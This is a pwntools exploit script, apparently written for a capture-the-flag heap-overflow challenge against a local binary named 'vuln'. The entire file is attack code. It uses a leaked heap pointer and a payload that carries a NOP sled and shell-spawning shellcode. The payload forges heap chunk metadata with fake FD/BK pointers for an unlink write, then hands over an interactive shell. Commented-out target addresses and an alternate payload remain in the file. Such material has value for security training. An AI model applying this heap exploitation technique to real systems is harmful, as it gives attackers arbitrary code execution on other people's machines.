#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./vuln
from pwn import *

# /problems/heap-overflow_1_3f101d883699357e88af6bd1165695cd
exe = context.binary = ELF('./vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#break *0x{exe.symbols.main:x}
#heap-analysis-helper
#b *0x08048b02
#b *malloc+1119
#b *main+259

# first gets
b *0x08048a6e  
# second gets
#b *0x08048a8e  
# first free
b *0x08048a9c
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

shellcode = asm(shellcraft.sh())
DEST=0x0804d034
DEST=0x0804d008
DEST=0x0804d028
#DEST=0x0804d000

io = start(argv=[])
io.recvuntil("decimal...\n")

data = io.recvline()
leak_firstptr = int(data)
print "LEAK: ", hex(leak_firstptr)

io.recvuntil("fullname\n")
payload = cyclic(0x2a0-4)
payload = "A"*8
payload += "\xEB\x0E\x90\x90"
payload += "\x90"*4*3
payload += shellcode
pad_len = (0x2a0-4)-len(payload)
payload += "-"*pad_len
payload += p32(0x49)
#payload += cyclic(0x48-4)
payload += p32(DEST-0x20+8+12) #FD->
payload += p32(leak_firstptr+0x10+0x10-24) #BK->
payload += cyclic(0x48-4-4-4)
payload += p32(0x48)
io.sendline(payload)

io.recvuntil("lastname\n")
payload = ""*66
payload += p32(0x11223344)
payload += p32(0xaabbccdd)
io.sendline(cyclic(66))

"""
io.sendline(cyclic(10))
io.recvuntil("very useful...")
payload = ""
payload += p32(DEST-0x20+8+12)
payload += p32(leak_firstptr+ 0x10+0x10-24)
payload += "\xEB\x0E\x90\x90"
payload += "\x90"*4*3
payload += shellcode
#payload += p32(leak_firstptr+ 0x14)
io.sendline(payload)
"""

io.interactive()

